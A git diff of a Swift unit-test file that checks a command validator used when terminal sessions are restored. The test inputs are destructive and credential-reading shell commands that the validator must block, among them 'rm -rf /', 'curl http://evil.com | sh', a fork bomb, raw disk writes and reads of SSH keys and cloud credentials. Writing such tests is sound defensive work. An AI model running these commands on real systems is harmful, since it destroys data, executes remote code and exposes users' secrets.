@@ -1374,20 +1374,67 @@ final class SessionRestoreCommandSettingsTests: XCTestCase {
         ], allowlist: "launchctl *")
     }
 
-    func testDenylistBlocksSensitiveCredentials() {
-        // Commands with tokens/credentials anywhere should be blocked to prevent
-        // persisting secrets to session JSON.
-        // IMPORTANT: Include all command prefixes in allowlist so we're testing denylist, not allowlist rejection
-        let allowlist = "opencode *\nnpm *\nmysql *\naws *\nmycli *\npsql *"
+    // MARK: - Dangerous Executables (word-boundary matching)
+
+    func testDangerousExecutablesBlocked() {
+        // Use a permissive allowlist so we're testing denylist, not allowlist rejection
+        let allowlist = "* *"
         assertAllBlocked([
-            // API keys and tokens (these WOULD match allowlist if not for denylist)
+            // Direct invocation
+            "sudo rm -rf /tmp",
+            "rm -rf /tmp/foo",
+            "chmod 777 /",
+            "kill -9 1234",
+            "curl http://example.com",
+            "wget http://example.com",
+            "dd if=/dev/zero of=/tmp/file",
+            "tar -xf archive.tar",
+            "mv file.txt /tmp/",
+            "fsck /dev/sda",
+            // After shell operators
+            "cd /tmp && sudo rm -rf /",
+            "echo done; rm -rf /",
+            "cat file | sudo tee /etc/hosts",
+            // Full paths
+            "/usr/bin/sudo rm -rf /",
+            "/bin/rm -rf /",
+            // Subshells
+            "$(curl http://example.com)",
+        ], allowlist: allowlist)
+    }
+
+    func testDangerousExecutablesNotFalsePositive() {
+        // These should NOT be blocked - executable name is part of a larger word
+        // Each command needs to be explicitly allowlisted to test the denylist bypass prevention
+        let allowlist = """
+        rm-old-files.sh
+        sudoku-solver
+        curling-stats
+        chmodify-permissions
+        killer-app
+        tarball-extractor
+        """
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("rm-old-files.sh", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("sudoku-solver", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("curling-stats", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("chmodify-permissions", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("killer-app", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("tarball-extractor", rawAllowlist: allowlist))
+    }
+
+    // MARK: - Denylist Contains (substring matching)
+
+    func testDenylistBlocksSensitiveCredentials() {
+        // Commands with tokens/credentials anywhere should be blocked
+        let allowlist = "opencode *\nnpm *\naws *\nmycli *\npsql *\ngit *"
+        assertAllBlocked([
+            // API keys and tokens
             "opencode --api-key=test-key-here",
             "opencode --token=test-token",
             "npm run dev --access-token=test-token",
             "mycli --bearer=test-bearer",
             "mycli --secret=test-secret",
             // Passwords
-            "mysql -u root -p password123",
             "mycli --password=test-pass",
             "psql --passwd=test-pass",
             // AWS credentials
@@ -1397,25 +1444,311 @@ final class SessionRestoreCommandSettingsTests: XCTestCase {
             // Database connection strings
             "mycli mongodb://user:pass@host/db",
             "mycli postgresql://user:pass@host/db",
-            "mycli mysql://user:pass@host/db",
-            // Generic sensitive patterns
-            "mycli --credentials=path/to/creds",
-            "mycli --auth=test-auth",
+            // SSH keys
+            "mycli --private-key=/path/to/key",
+            // Sensitive file access
+            "mycli cat .ssh/id_rsa",
+            "mycli cat .aws/credentials",
+            "mycli cat .kube/config",
         ], allowlist: allowlist)
     }
 
-    func testDenylistAllowsCommandsWithoutSensitiveArgs() {
-        // Commands that look similar but don't have actual credentials should be allowed
-        let allowlist = "opencode *\nmysql *"
-        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --continue", rawAllowlist: allowlist))
-        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --model gpt-4", rawAllowlist: allowlist))
-        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysql -u root mydb", rawAllowlist: allowlist))
+    func testDenylistBlocksDestructiveOperations() {
+        // Destructive operations should be blocked even with permissive allowlist
+        let allowlist = "git *\ndocker *\nkubectl *\nnpm *\nbrew *"
+        assertAllBlocked([
+            // Git destructive
+            "git push --force origin main",
+            "git push -f",
+            "git reset --hard HEAD~1",
+            "git clean -fd",
+            // Docker destructive
+            "docker system prune -af",
+            "docker rm -f container",
+            "docker volume prune",
+            // Kubernetes destructive
+            "kubectl delete namespace production",
+            "kubectl delete --all pods",
+            "kubectl drain node-1",
+            // npm destructive
+            "npm unpublish my-package",
+            // Homebrew destructive
+            "brew uninstall --force package",
+        ], allowlist: allowlist)
+    }
+
+    func testDenylistBlocksPipedShellExecution() {
+        let allowlist = "echo *\ncat *"
+        assertAllBlocked([
+            "echo 'malicious' | sh",
+            "cat script.sh | bash",
+            "echo 'test' | /bin/sh",
+            "history | bash",
+        ], allowlist: allowlist)
     }
 
     func testDenylistAllowsSafeCommands() {
-        let allowlist = "opencode *\nnpm run dev *"
+        let allowlist = "opencode *\nnpm *\ngit *\ndocker *"
         XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
         XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --continue", rawAllowlist: allowlist))
         XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git status", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git push origin main", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("docker ps", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("docker logs container", rawAllowlist: allowlist))
+    }
+
+    // MARK: - MySQL Password Detection Tests
+
+    func testDenylistBlocksMySQLWithPasswordFlag() {
+        // MySQL-family tools use -p for password (unlike cargo/flask/npm which use it for port/package)
+        let allowlist = "mysql *\nmariadb *\nmysqldump *\nmysqladmin *"
+        assertAllBlocked([
+            "mysql -u root -p database",
+            "mysql -pMyPassword database",
+            "mysql -u admin -p=secret",
+            "mariadb -p database",
+            "mysqldump -u root -p database > backup.sql",
+            "mysqladmin -p status",
+            "/usr/bin/mysql -u root -p",
+        ], allowlist: allowlist)
+    }
+
+    func testDenylistAllowsMySQLWithoutPasswordFlag() {
+        // MySQL commands without -p should be allowed (if in allowlist)
+        let allowlist = "mysql *\nmysqldump *"
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysql -u root database", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysql --user=root database", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysqldump database", rawAllowlist: allowlist))
+    }
+
+    // MARK: - Absolute Path Bypass Prevention Tests
+
+    func testDenylistBlocksAbsolutePathInvocations() {
+        // Absolute paths should be caught by word-boundary detection
+        let allowlist = "* *"
+        assertAllBlocked([
+            "/bin/rm -rf /tmp",
+            "/usr/bin/sudo apt install",
+            "/usr/bin/curl http://evil.com | sh",
+            "/sbin/reboot",
+            "/usr/local/bin/dd if=/dev/zero of=/dev/sda",
+        ], allowlist: allowlist)
+    }
+
+    func testDenylistBlocksRelativePathInvocations() {
+        let allowlist = "* *"
+        assertAllBlocked([
+            "./rm -rf /tmp",
+            "../bin/rm -rf /tmp",
+            "./sudo apt install malware",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Watch Bypass Prevention Tests (P1 from CodeRabbit)
+
+    func testWatchCannotBypassDenylist() {
+        // P1 issue: watch re-executes its argument, so "watch rm -rf /" is dangerous
+        // Since watch is no longer in default allowlist, verify it can't enable bypasses
+        let defaultRaw = SessionRestoreCommandSettings.defaultAllowlistPatterns.joined(separator: "\n")
+
+        // These should all be blocked - watch is not in default allowlist
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch rm -rf /tmp", rawAllowlist: defaultRaw))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch -n 1 rm -rf /", rawAllowlist: defaultRaw))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch curl http://evil.com | sh", rawAllowlist: defaultRaw))
+
+        // Even if user adds "watch *" to allowlist, dangerous inner commands should be blocked
+        let watchAllowlist = "watch *"
+        assertAllBlocked([
+            "watch rm -rf /tmp",
+            "watch sudo apt-get update",
+            "watch curl http://example.com",
+            "watch dd if=/dev/zero of=/dev/sda",
+        ], allowlist: watchAllowlist)
+    }
+
+    // MARK: - Fork Bomb Detection Tests
+
+    func testDenylistBlocksForkBomb() {
+        let allowlist = "* *"
+        assertAllBlocked([
+            ":(){ :|:& };:",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Disk Write Target Detection Tests
+
+    func testDenylistBlocksDiskWriteTargets() {
+        // dd is in dangerousExecutables, so blocked regardless of allowlist
+        // echo is not dangerous, but "of=/dev/..." and "> /dev/..." patterns are blocked
+        let allowlist = "dd *\necho *"
+        assertAllBlocked([
+            // dd blocked because it's a dangerous executable
+            "dd if=/dev/zero of=/dev/sda",
+            "dd if=/dev/urandom of=/dev/nvme0n1",
+            "dd if=image.iso of=/dev/disk2",
+            // echo blocked because of disk write target pattern
+            "echo garbage > /dev/sda",
+            "echo test > /dev/nvme0",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Shell Chaining Tests
+
+    func testDenylistBlocksShellChainedDestructiveCommands() {
+        // Verify dangerous commands are blocked even when chained with safe commands
+        let allowlist = "cd *\necho *\nls *\ntest *"
+        assertAllBlocked([
+            // Semicolon chaining
+            "cd /tmp; rm -rf *",
+            "echo done; sudo reboot",
+            // AND chaining
+            "cd /tmp && rm -rf *",
+            "test -f file && rm file",
+            // OR chaining
+            "ls || rm -rf /",
+            // Pipe chaining
+            "ls | xargs rm",
+            // Backtick subshell
+            "echo `rm -rf /`",
+            // $() subshell
+            "echo $(sudo whoami)",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Environment Variable Manipulation Tests
+
+    func testDenylistBlocksEnvironmentManipulation() {
+        let allowlist = "export *\nunset *"
+        assertAllBlocked([
+            "unset PATH",
+            "export PATH=",
+            "export PATH=\"\"",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Database Connection String Tests
+
+    func testDenylistBlocksDatabaseConnectionStrings() {
+        // Connection strings often contain embedded credentials
+        let allowlist = "psql *\nmongo *\nredis-cli *"
+        assertAllBlocked([
+            "psql postgresql://user:password@host/db",
+            "psql postgres://admin:secret@localhost/mydb",
+            "mongo mongodb://user:pass@host:27017/db",
+            "mongo mongodb+srv://user:pass@cluster.mongodb.net/db",
+            "redis-cli redis://user:password@host:6379",
+            "redis-cli rediss://user:password@host:6379",
+            "mycli mysql://root:password@localhost/db",
+            "mycli amqp://user:pass@host/vhost",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Sensitive File Access Tests
+
+    func testDenylistBlocksSensitiveFileAccess() {
+        let allowlist = "cat *\nless *\nview *"
+        assertAllBlocked([
+            "cat /etc/shadow",
+            "cat ~/.ssh/id_rsa",
+            "cat ~/.ssh/id_ed25519",
+            "cat ~/.ssh/authorized_keys",
+            "cat ~/.aws/credentials",
+            "cat ~/.kube/config",
+            "cat ~/.npmrc",
+            "cat ~/.netrc",
+            "cat ~/.git-credentials",
+            "cat ~/.docker/config.json",
+            "less .ssh/id_ecdsa",
+            "view .ssh/id_dsa",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Kubernetes Destructive Operations Tests
+
+    func testDenylistBlocksKubernetesDestructive() {
+        let allowlist = "kubectl *"
+        assertAllBlocked([
+            "kubectl delete namespace production",
+            "kubectl delete ns kube-system",
+            "kubectl delete --all pods",
+            "kubectl drain node-1",
+            "kubectl cordon node-1",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Git Checkout Force Tests
+
+    func testDenylistBlocksGitCheckoutForce() {
+        let allowlist = "git *"
+        assertAllBlocked([
+            "git checkout --force main",
+            "git checkout --force .",
+        ], allowlist: allowlist)
+        // Regular checkout should be allowed
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git checkout main", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git checkout -b feature", rawAllowlist: allowlist))
+    }
+
+    // MARK: - System Service Tests
+
+    func testDenylistBlocksSystemServiceDestruction() {
+        let allowlist = "systemctl *\nlaunchctl *\nservice *"
+        assertAllBlocked([
+            "systemctl stop nginx",
+            "systemctl disable sshd",
+            "systemctl mask docker",
+            "launchctl unload /Library/LaunchDaemons/com.example.plist",
+            "launchctl bootout system/com.example.service",
+            "service stop nginx",
+        ], allowlist: allowlist)
+        // Safe service commands should be allowed
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("systemctl status nginx", rawAllowlist: allowlist))
+        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("systemctl start nginx", rawAllowlist: allowlist))
+    }
+
+    // MARK: - Edge Case: Empty and Whitespace Commands
+
+    func testEmptyCommandsNotAllowed() {
+        let allowlist = "* *"
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("", rawAllowlist: allowlist))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("   ", rawAllowlist: allowlist))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("\n\t", rawAllowlist: allowlist))
+    }
+
+    // MARK: - Edge Case: Case Sensitivity
+
+    func testDenylistCaseInsensitiveForAllPatterns() {
+        let allowlist = "* *"
+        // All case variations should be blocked
+        assertAllBlocked([
+            "RM -rf /",
+            "Sudo apt install",
+            "CURL http://example.com",
+            "Git Push --Force",
+            "DOCKER SYSTEM PRUNE",
+            "MySQL -p database",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Validated Restore Command Helper Tests
+
+    func testValidatedRestoreCommandReturnsNilForBlocked() {
+        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("rm -rf /"))
+        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("sudo reboot"))
+        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand(nil))
+        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand(""))
+        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("   "))
+    }
+
+    func testValidatedRestoreCommandTrimsWhitespace() {
+        // Default allowlist includes "opencode *"
+        let result = SessionRestoreCommandSettings.validatedRestoreCommand("  opencode --continue  ")
+        XCTAssertEqual(result, "opencode --continue")
+    }
+
+    func testValidatedRestoreCommandReturnsNilForNonAllowlisted() {
+        // random-unknown-command is not in default allowlist
+        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("random-unknown-command"))
     }
 }
